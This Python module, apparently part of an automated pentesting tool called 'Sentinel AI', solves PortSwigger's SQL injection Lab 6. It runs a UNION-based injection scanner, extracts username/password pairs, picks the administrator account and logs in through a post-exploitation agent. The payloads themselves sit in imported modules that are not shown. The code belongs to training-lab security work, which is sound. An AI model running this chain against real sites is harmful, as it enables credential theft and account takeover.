"""
===========================================================
Project : Sentinel AI
Module  : Lab 6 Handler
File ID : SCANNER-LAB6-001
Version : 1.0.0
===========================================================

Description:
Specialized handler for PortSwigger SQL Injection Lab 6.
Lab 6: SQL injection UNION attack, retrieving data from other tables
Uses UNION-based SQL Injection exclusively.
"""

from __future__ import annotations

import logging
import re
from typing import Dict, Any, Optional, List, Tuple

from app.modules.scanner.modules.union_sqli import UnionSQLiScanner, UnionFinding
from app.agents.post_exploitation_agent import PostExploitationAgent

logger = logging.getLogger(__name__)


class Lab6Handler:
    """
    Specialized handler for PortSwigger SQL Injection Lab 6.
    Uses ONLY UNION-based SQL Injection.
    """

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parameter = self._detect_parameter(target_url)
        self.credentials: List[Dict[str, str]] = []
        self.union_findings = None
        self.scan_result: Optional[Dict[str, Any]] = None
        self.login_success: bool = False
        self.dbms: Optional[str] = None

        self.statistics = {
            "requests": 0,
            "detection_attempts": 0,
            "extraction_attempts": 0,
            "findings": 0,
        }

    def _detect_parameter(self, url: str) -> str:
        """Detect the parameter name from URL."""
        if "category" in url:
            return "category"
        elif "productId" in url:
            return "productId"
        elif "id" in url:
            return "id"
        elif "filter" in url:
            return "filter"
        return "category"

    def run(self) -> Dict[str, Any]:
        """
        Execute complete Lab 6 solution using UNION-based SQLi only.

        Returns:
            Dictionary with scan results and lab completion status
        """
        logger.info("=" * 60)
        logger.info(
            "PortSwigger Lab 6: UNION Attack (Retrieving data from other tables)"
        )
        logger.info("=" * 60)

        # ============================================================
        # Step 1: UNION SQLi (Primary and ONLY method for Lab 6)
        # ============================================================
        logger.info("[Lab6] Step 1: Starting UNION SQLi...")
        logger.info("[Lab6] ✅ Selected engine: UNION-Based SQLi")

        union_scanner = UnionSQLiScanner(self.target_url)
        union_scanner.parameter = self.parameter
        self.union_findings = union_scanner.scan()

        if self.union_findings and len(self.union_findings) > 0:
            logger.info("[Lab6] ✅ UNION SQLi detected!")
            self.scan_result = {
                "type": "union",
                "findings": self.union_findings,
            }

            # Extract DBMS from findings
            if hasattr(self.union_findings[0], "dbms"):
                self.dbms = self.union_findings[0].dbms
                logger.info(f"[Lab6] ✅ DBMS: {self.dbms}")

            # Extract credentials from findings
            self.credentials = self._extract_credentials_from_findings(
                self.union_findings
            )

            if self.credentials:
                logger.info(f"[Lab6] ✅ Credentials extracted: {len(self.credentials)}")
                self._attempt_login()
                return self._build_response()

        # ============================================================
        # Step 2: If UNION fails, log and return
        # ============================================================
        logger.info("[Lab6] ❌ UNION SQLi not found for Lab 6")
        return self._build_response()

    def _extract_credentials_from_findings(self, findings) -> List[Dict[str, str]]:
        """Extract credentials from UNION SQLi findings."""
        credentials = []
        for finding in findings:
            if hasattr(finding, "extracted_data") and finding.extracted_data:
                for row in finding.extracted_data:
                    if isinstance(row, dict):
                        username = (
                            row.get("username") or row.get("user") or row.get("name")
                        )
                        password = (
                            row.get("password") or row.get("pass") or row.get("pwd")
                        )
                        if username and password:
                            credentials.append(
                                {"username": username, "password": password}
                            )
        return credentials

    def _attempt_login(self) -> bool:
        """Attempt to login using extracted credentials."""
        if not self.credentials:
            logger.info("[Lab6] ⚠️ No credentials to attempt login")
            return False

        # Find administrator credentials
        admin_cred = None
        for cred in self.credentials:
            if cred.get("username", "").lower() == "administrator":
                admin_cred = cred
                break

        if not admin_cred:
            admin_cred = self.credentials[0]

        logger.info(f"[Lab6] 🔐 Attempting login as: {admin_cred.get('username')}")

        try:
            from app.agents.post_exploitation_agent import PostExploitationAgent

            post_agent = PostExploitationAgent()
            login_success = post_agent.exploit_credentials(
                self.target_url, [admin_cred]
            )

            self.login_success = login_success
            return login_success

        except ImportError as e:
            logger.error(f"[Lab6] ❌ PostExploitationAgent import failed: {e}")
            return False

    def _build_response(self) -> Dict[str, Any]:
        """Build the final response."""
        return {
            "target": self.target_url,
            "parameter": self.parameter,
            "scan_type": self.scan_result.get("type") if self.scan_result else "union",
            "dbms": self.dbms,
            "findings": self.scan_result.get("findings") if self.scan_result else [],
            "credentials": self.credentials,
            "login_success": self.login_success,
            "lab_completed": self.login_success,
            "statistics": self.statistics,
        }


def solve_lab6(target_url: str) -> Dict[str, Any]:
    """
    Convenience function to solve Lab 6 using UNION-based SQLi only.

    Args:
        target_url: Target URL

    Returns:
        Dictionary with results
    """
    handler = Lab6Handler(target_url)
    return handler.run()
